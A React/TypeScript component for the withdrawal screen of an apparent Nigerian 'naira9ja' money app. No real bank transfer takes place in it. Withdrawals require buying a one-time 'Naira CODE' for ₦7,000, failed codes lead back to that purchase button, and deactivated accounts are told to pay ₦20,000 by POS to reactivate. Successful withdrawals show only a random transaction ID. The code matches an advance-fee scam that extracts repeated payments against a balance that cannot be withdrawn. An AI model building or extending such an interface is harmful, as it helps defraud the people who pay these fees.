
import React, { useState } from 'react';
import { Icons } from './Icons';
import { User } from '../types';

interface SendMoneyProps {
  user: User;
  onTransfer: (amount: number, recipientInfo: string) => void;
  onSubscribeRedirect: () => void;
  onGoHome: () => void;
}

const banks = [
  "OPAY",
  "PALMPAY",
  "KUDA",
  "MONIEPOINT",
  "Access Bank",
  "GTBank",
  "Zenith Bank",
  "UBA",
  "First Bank",
  "Fidelity Bank",
  "Union Bank",
  "FCMB",
  "Sterling Bank"
];

const SendMoney: React.FC<SendMoneyProps> = ({ user, onTransfer, onSubscribeRedirect, onGoHome }) => {
  const [step, setStep] = useState<'form' | 'success' | 'failed'>('form');
  const [bank, setBank] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountName, setAccountName] = useState('');
  const [amount, setAmount] = useState('');
  const [nairaCode, setNairaCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const VALID_NAIRA_CODE = 'nairaABC';

  // Calculate deactivation state dynamically
  const isDeactivated = user.deactivationDate && Date.now() > user.deactivationDate;

  // Simulate account name lookup (REMOVED as per request)
  const handleAccountNumberBlur = () => {
    // No longer auto-filling name
  };

  const [failureReason, setFailureReason] = useState<string>('');

  const activeCodeObj = user.activeNairaCode;
  const hasUnusedActiveCode = activeCodeObj && !activeCodeObj.isUsed;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    if (isDeactivated) {
      setError("Account is deactivated");
      return;
    }

    if (!nairaCode) {
      setError("Please enter your Naira CODE");
      return;
    }

    if (!accountName) {
      setError("Please enter the Account Name");
      return;
    }

    const transferAmount = parseFloat(amount);
    if (isNaN(transferAmount) || transferAmount <= 0) {
      setError("Please enter a valid amount");
      return;
    }

    if (transferAmount > user.balance) {
      setError("Insufficient funds");
      return;
    }

    setIsLoading(true);

    const inputCodeClean = nairaCode.trim().toUpperCase();

    // Check validity
    let isValidCode = false;
    let isAlreadyUsed = false;

    if (activeCodeObj) {
      if (activeCodeObj.code.trim().toUpperCase() === inputCodeClean) {
        if (activeCodeObj.isUsed) {
          isAlreadyUsed = true;
        } else {
          isValidCode = true;
        }
      }
    }

    // Fallback legacy test code
    if (!isValidCode && inputCodeClean === 'NAIRAABC') {
      isValidCode = true;
    }

    setTimeout(() => {
      if (isValidCode) {
        // Mark code as used in user's state and localStorage
        try {
          const storedUsersStr = localStorage.getItem('naira9ja_users');
          if (storedUsersStr && user?.email) {
            const usersMap: Record<string, User> = JSON.parse(storedUsersStr);
            const userKey = user.email.toLowerCase();
            if (usersMap[userKey]) {
              if (usersMap[userKey].activeNairaCode) {
                usersMap[userKey].activeNairaCode!.isUsed = true;
                usersMap[userKey].activeNairaCode!.usedAt = Date.now();
              }
              // Also update user object passed
              if (user.activeNairaCode) {
                user.activeNairaCode.isUsed = true;
                user.activeNairaCode.usedAt = Date.now();
              }
              localStorage.setItem('naira9ja_users', JSON.stringify(usersMap));
            }
          }
        } catch (e) {
          console.error('Failed to mark naira code as used:', e);
        }

        onTransfer(transferAmount, `Withdraw to ${bank} - ${accountName} (Code: ${inputCodeClean})`);
        setIsLoading(false);
        setStep('success');
      } else if (isAlreadyUsed) {
        setIsLoading(false);
        setFailureReason('This Naira CODE has already been used and expired. Each Naira CODE can only be used once. Please purchase a new Naira CODE for your next withdrawal.');
        setStep('failed');
      } else {
        setIsLoading(false);
        setFailureReason('Invalid Naira CODE. Please ensure you enter the active CODE issued to your dashboard, or purchase a new code.');
        setStep('failed');
      }
    }, 1500);
  };

  if (isDeactivated) {
    return (
        <div className="px-4 py-10 flex flex-col items-center justify-center text-center space-y-6 animate-in zoom-in duration-300">
           <div className="w-24 h-24 bg-red-900/30 rounded-full flex items-center justify-center mb-4">
              <Icons.Ban size={48} className="text-red-400" />
          </div>
          <div>
              <h2 className="text-2xl font-bold text-white mb-2">Withdrawal Restricted</h2>
              <div className="bg-red-900/20 p-4 rounded-xl border border-red-800">
                 <p className="text-red-300 font-bold text-sm leading-relaxed">
                     User must pay 20,000 naira to activate account, using a POS.
                 </p>
              </div>
          </div>
          <button 
              onClick={onGoHome}
              className="w-full max-w-sm bg-gray-800 text-white font-bold py-3 rounded-full transition-all"
          >
              Back to Dashboard
          </button>
        </div>
    );
  }

  if (step === 'failed') {
    return (
      <div className="px-4 py-8 flex flex-col items-center justify-center text-center space-y-6 animate-in zoom-in duration-300">
         <div className="w-24 h-24 bg-red-900/10 rounded-full flex items-center justify-center mb-4 relative">
            <div className="absolute inset-0 rounded-full border-4 border-red-500 opacity-20 animate-ping"></div>
            <Icons.X size={48} className="text-red-500" />
        </div>
        <div>
            <h2 className="text-2xl font-bold text-white mb-1">Withdrawal Failed!</h2>
            <p className="text-gray-500 text-sm">
                Your withdrawal request of <span className="font-bold text-white">₦{parseFloat(amount).toLocaleString()}</span> was declined.
            </p>
        </div>
        <div className="bg-red-900/20 p-4 rounded-xl w-full max-w-sm border border-red-800 space-y-1">
            <p className="text-red-400 text-xs font-bold uppercase">Reason: Naira CODE Verification Failed</p>
            <p className="text-slate-300 text-xs font-medium mt-1 leading-relaxed">
              {failureReason || "Please ensure you are using the active Naira CODE assigned to your account."}
            </p>
        </div>
        <button 
            onClick={() => setStep('form')}
            className="w-full max-w-sm bg-gray-800 text-white font-bold py-3 rounded-full shadow-md transition-all uppercase tracking-wider text-xs"
        >
            Try Again
        </button>
        <button 
            onClick={onSubscribeRedirect}
            className="w-full max-w-sm bg-gradient-to-r from-amber-500 to-amber-600 text-slate-950 font-black py-3 rounded-full shadow-lg transition-all uppercase tracking-wider text-xs"
        >
            Purchase New Naira CODE (₦7,000)
        </button>
        <button 
            onClick={onGoHome}
            className="text-gray-500 text-xs hover:text-white transition-colors"
        >
            Back to Dashboard
        </button>
      </div>
    );
  }

  if (step === 'success') {
    return (
      <div className="px-4 py-8 flex flex-col items-center justify-center text-center space-y-6 animate-in zoom-in duration-300">
         <div className="w-24 h-24 bg-green-neon/10 rounded-full flex items-center justify-center mb-4 relative">
            <div className="absolute inset-0 rounded-full border-4 border-green-neon opacity-20 animate-ping"></div>
            <Icons.Check size={48} className="text-green-neon" />
        </div>
        <div>
            <h2 className="text-2xl font-bold text-white mb-1">Withdrawal Successful!</h2>
            <p className="text-gray-500 text-sm">
                You successfully withdrew <span className="font-bold text-white">₦{parseFloat(amount).toLocaleString()}</span> to {accountName}.
            </p>
        </div>
        <div className="bg-gray-900 p-4 rounded-xl w-full max-w-sm border border-gray-800">
            <div className="flex justify-between py-2 border-b border-gray-800">
                <span className="text-xs text-gray-500">Bank</span>
                <span className="text-sm font-bold text-white">{bank}</span>
            </div>
             <div className="flex justify-between py-2 border-b border-gray-800">
                <span className="text-xs text-gray-500">Account</span>
                <span className="text-sm font-bold text-white">{accountNumber}</span>
            </div>
            <div className="flex justify-between py-2">
                <span className="text-xs text-gray-500">Transaction ID</span>
                <span className="text-xs font-mono text-white">TRX-{Math.floor(Math.random() * 100000000)}</span>
            </div>
        </div>
        <button 
            onClick={onGoHome}
            className="w-full max-w-sm bg-green-neon text-black font-bold py-3 rounded-full shadow-md transition-all"
        >
            Done
        </button>
      </div>
    );
  }

  return (
    <div className="px-4 py-6 space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
      <div className="text-center">
         <h2 className="text-xl font-bold text-white">Withdraw to Bank</h2>
         <p className="text-xs text-slate-400 mt-0.5">Instant transfer to any Nigerian bank</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4 bg-[#12142e] p-5 rounded-3xl border border-[#212552] shadow-2xl">
        {error && (
             <div className="bg-rose-950/80 text-rose-300 text-xs p-3 rounded-xl text-center border border-rose-800/50 font-medium">
                {error}
              </div>
        )}

        <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1 ml-1">Select Bank</label>
            <div className="relative">
                <select
                    value={bank}
                    onChange={(e) => setBank(e.target.value)}
                    required
                    className="w-full p-3.5 bg-[#181a3c] border border-[#2d3269] rounded-2xl appearance-none text-white focus:border-purple-500 outline-none text-sm"
                >
                    <option value="" disabled>Choose a bank</option>
                    {banks.map(b => (
                        <option key={b} value={b} className="bg-[#12142e] text-white">{b}</option>
                    ))}
                </select>
                <Icons.ChevronRight className="absolute right-3.5 top-4 text-slate-400 rotate-90" size={18} />
            </div>
        </div>

        <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1 ml-1">Account Number</label>
            <input
                type="number"
                value={accountNumber}
                onChange={(e) => {
                    if (e.target.value.length <= 10) setAccountNumber(e.target.value);
                }}
                onBlur={handleAccountNumberBlur}
                placeholder="0123456789"
                required
                className="w-full p-3.5 bg-[#181a3c] border border-[#2d3269] rounded-2xl text-white placeholder-slate-500 focus:border-purple-500 outline-none font-mono text-base tracking-wider"
            />
        </div>

        <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1 ml-1">Account Name</label>
            <input
                type="text"
                value={accountName}
                onChange={(e) => setAccountName(e.target.value)}
                placeholder="Account Holder Name"
                required
                className="w-full p-3.5 bg-[#181a3c] border border-[#2d3269] rounded-2xl text-white font-semibold focus:border-purple-500 outline-none text-sm"
            />
        </div>

        <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1 ml-1">Amount</label>
            <div className="relative">
                <span className="absolute left-3.5 top-3.5 text-slate-400 font-bold">₦</span>
                <input
                    type="number"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    placeholder="0.00"
                    required
                    className="w-full p-3.5 pl-8 bg-[#181a3c] border border-[#2d3269] rounded-2xl text-white font-bold text-lg focus:border-purple-500 outline-none"
                />
            </div>
            <p className="text-[11px] text-purple-300 font-medium text-right mt-1">
                Available: ₦{user.balance.toLocaleString()}
            </p>
        </div>

        <div>
            <div className="flex justify-between items-center mb-1 ml-1">
              <label className="text-xs font-semibold text-slate-300">Naira CODE</label>
              {hasUnusedActiveCode && (
                <button
                  type="button"
                  onClick={() => setNairaCode(activeCodeObj.code)}
                  className="text-[11px] font-black text-amber-400 bg-amber-500/10 hover:bg-amber-500/20 px-2 py-0.5 rounded-lg border border-amber-500/30 transition-all flex items-center space-x-1"
                >
                  <Icons.Key size={12} />
                  <span>Use Active: {activeCodeObj.code}</span>
                </button>
              )}
            </div>
            <input
                type="text"
                value={nairaCode}
                onChange={(e) => setNairaCode(e.target.value)}
                placeholder={hasUnusedActiveCode ? activeCodeObj.code : "Enter your 1-time Naira CODE"}
                required
                className="w-full p-3.5 bg-[#181a3c] border border-[#2d3269] rounded-2xl text-white font-bold font-mono focus:border-purple-500 outline-none text-sm tracking-wider"
            />
            <div className="flex justify-between items-center mt-1.5 ml-1">
              <button 
                  type="button"
                  onClick={onSubscribeRedirect}
                  className="text-xs text-purple-400 font-bold hover:underline flex items-center space-x-1"
              >
                  <span>Need a new code? Purchase Naira CODE →</span>
              </button>
            </div>
        </div>

        <button
            type="submit"
            disabled={isLoading || !bank || !accountNumber || !amount || !nairaCode || !accountName}
            className="w-full py-4 bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 disabled:opacity-50 text-white font-bold rounded-2xl shadow-[0_4px_20px_rgba(124,58,237,0.4)] transition-all mt-4 flex items-center justify-center space-x-2"
        >
            {isLoading ? (
                <span>Processing...</span>
            ) : (
                <>
                    <span>Withdraw Funds</span>
                    <Icons.ArrowUpRight size={18} />
                </>
            )}
        </button>
      </form>
    </div>
  );
};

export default SendMoney;
